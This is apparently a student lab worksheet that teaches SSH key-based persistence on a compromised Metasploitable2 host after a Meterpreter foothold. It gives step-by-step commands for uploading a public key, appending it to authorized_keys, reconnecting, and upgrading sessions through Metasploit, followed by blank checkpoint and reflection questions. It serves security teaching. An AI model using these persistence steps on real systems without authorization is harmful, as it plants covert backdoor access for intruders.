# 📝 Student Worksheet – SSH Persistence After Initial Foothold

## Objective  
In this lab, you will learn how to maintain access on a compromised Linux system by setting up **SSH key-based persistence** after gaining your first shell foothold (e.g., via Meterpreter).

---

## Step 1 – Generate SSH Keys (on Kali)  
We first create an RSA key pair (public + private key) to authenticate later.

```bash
ssh-keygen -t rsa -b 2048 -f ./id_rsa -N ""
```

✅ **Checkpoint:**  
- Which two files were generated? (e.g., `id_rsa`, `id_rsa.pub`)?
Answer:
- Which file should never be shared? (private key or public key?)
Answer:

---

## Step 2 – Upload Public Key to Target  
From your Meterpreter session, upload the public key:

```bash
upload id_rsa.pub /tmp/id_rsa.pub
```

✅ **Checkpoint:**  
- Where is the public key stored on the target?
Answer:

---

## Step 3 – Configure Persistence on Target  
Open a shell inside Meterpreter:

```bash
shell
```

Now run these commands **one at a time**:

```bash
mkdir -p ~/.ssh
cat /tmp/id_rsa.pub >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
rm /tmp/id_rsa.pub
exit
```

✅ **Checkpoint:**  
- What does `chmod 600 ~/.ssh/authorized_keys` do?  
Answer: 

---

## Step 4 – Connect Back with SSH  
On Kali, use the private key to connect:

```bash
ssh -i ./id_rsa -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa <username>@<target-ip>
```

- **Username:** Found by running `whoami` inside the foothold shell (e.g., `www-data`)  
- **Target IP:** Found on Metasploitable2 using:

```bash
ifconfig
```

✅ **Checkpoint:**  
- What username did you gain access as? 
Answer:  
- What is the target IP?
Answer:

**Note:** Type `yes` if prompted about host fingerprinting.  

---

## Step 5 – Persistence with Metasploit (Optional)  
You can also manage SSH persistence via Metasploit.

1. Start Metasploit:  
   ```bash
   msfconsole
   ```

2. Configure the module:  
   ```bash
   use auxiliary/scanner/ssh/ssh_login_pubkey
   set rhost <target-ip>
   set USERNAME www-data
   set KEY_PATH ./id_rsa
   set SSH_KEYFILE_ALGS +ssh-rsa,ssh-dss
   run
   ```

3. List sessions:  
   ```bash
   sessions -l
   ```

4. Upgrade shell session to Meterpreter:  
   ```bash
   sessions -u <session-id>
   ```

5. Interact with the new session:  
   ```bash
   sessions -i <new-session-id>
   ```

✅ **Checkpoint:**  
- What session ID was upgraded?  
Answer:
- Why might upgrading to Meterpreter be useful?
Answer:

---

## Reflection Questions
- Why is SSH persistence more reliable than keeping only a Meterpreter shell?
Answer:  
- What security controls could prevent an attacker from using this technique?  
Answer: 

---

⚠️ **Ethics Reminder:**  
This technique is for **educational purposes only**. Never attempt persistence on a system you do not own or have explicit permission to test.  
